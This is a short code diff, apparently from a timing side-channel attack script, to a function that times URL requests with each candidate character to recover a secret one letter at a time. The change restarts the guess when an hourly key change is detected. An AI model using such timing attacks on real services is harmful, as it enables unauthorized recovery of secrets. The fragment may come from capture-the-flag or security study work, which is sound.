@@ -63,6 +63,11 @@ def find_cur_letter(url, pool, padding_length):
     wrong_time = timeit(url + '*' * padding_length, REPEAT_CHECK)
     timings = {}
     for ch in pool:
+        last_key_letter = current_letter
+        check_hour_change()
+        if last_key_letter != current_letter:
+            return find_cur_letter(url, pool, padding_length)
+        
         test_url = url + ch * padding_length
         t = timeit(test_url, REPEAT_CHECK)
         timings[ch] = t
